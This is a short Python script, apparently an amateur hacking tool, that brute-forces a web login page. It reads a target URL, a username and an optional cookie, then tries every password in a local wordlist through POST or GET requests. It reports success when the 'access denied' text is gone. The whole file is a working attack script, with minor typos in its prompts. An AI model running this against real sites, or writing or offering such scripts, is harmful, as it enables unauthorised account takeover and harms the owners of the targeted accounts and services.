import requests
from termcolor import colored

url = input('https://')
username: str =input("urername")
login_failed_string = ("access denied")
cookie_value = input('Enter Cookie Value(Optional): ')


def cracking(account, site):
    for password in passwords:
        password = password.strip()
        print(colored(('Trying: ' + password), 'red'))
        data = {'username': account, 'password': password, 'Login': 'submit'}
        if cookie_value != '':
            response = requests.get(site, params={'username': account, 'password': password, 'Login': 'Login'},
                                    cookies={'Cookie': cookie_value})
        else:
            response = requests.post(site, data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored(('[+] Found Username: ==> ' + account), 'red'))
            print(colored(('[+] Found Password: ==> ' + password), 'red'))
            exit()


with open('../(Passwords.txt)', 'r') as passwords:
    cracking(username, url)

print('[!!] Password Not In List')



